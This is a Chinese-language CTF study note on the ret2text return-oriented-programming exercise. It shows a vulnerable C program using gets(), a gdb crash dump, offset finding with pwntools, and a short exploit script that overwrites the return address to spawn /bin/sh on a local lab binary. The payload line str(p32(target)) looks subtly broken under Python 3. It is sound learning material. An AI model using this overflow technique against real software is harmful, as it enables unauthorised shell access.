# ROP

记录学习ROP时做的题


<!-- vim-markdown-toc GFM -->

* [ret2text](#ret2text)
	* [ret2text](#ret2text-1)

<!-- vim-markdown-toc -->

## ret2text

### ret2text

源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void secure(void)
{
    int secretcode, input;
    srand(time(NULL));

    secretcode = rand();
    scanf("%d", &input);
    if(input == secretcode)
        system("/bin/sh");
}

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf[100];

    printf("There is something amazing here, do you know anything?\n");
    gets(buf);
    printf("Maybe I will tell you next time !");

    return 0;
}
```

源代码中有main()函数和secure()函数。
main()中`gets(buf)`可以控制输入，溢出。如果能使RA被覆盖成secure()中出现的`system("/bin/sh")`地址就可以完成攻击。

首先确定输入,使用py3的`cyclic(200)`生成200个字符的字符串

```
gdb-peda$ run
Starting program: /---/ret2text
There is something amazing here, do you know anything?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Maybe I will tell you next time !
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x0
ECX: 0x21 ('!')
EDX: 0xf7fab890 --> 0x0
ESI: 0xf7faa000 --> 0x1d7d8c
EDI: 0x0
EBP: 0x62616163 ('caab')
ESP: 0xffffcd30 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
EIP: 0x62616164 ('daab')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x62616164
[------------------------------------stack-------------------------------------]
0000| 0xffffcd30 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0004| 0xffffcd34 ("faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0008| 0xffffcd38 ("gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0012| 0xffffcd3c ("haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0016| 0xffffcd40 ("iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0020| 0xffffcd44 ("jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0024| 0xffffcd48 ("kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0028| 0xffffcd4c ("laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x62616164 in ?? ()

```

可以看到`0x62616164 in ?? ()`这个地址是无效的,也就是RA被覆盖成了这个无效的地址。

py3使用pwn寻找offset

```python
>>> cyclic(200)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
>>> p32(0x62616164)
b'daab'
>>> cyclic_find('daab')
112
```

打开ida,搜索字符串bin/sh
```
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
```
即需要将RA覆盖为0804863A

exp

```python
from pwn import *

target = 0x0804863a

sh = process("./ret2text")

sh.sendline('A'*112+str(p32(target)))
sh.interactive()
```
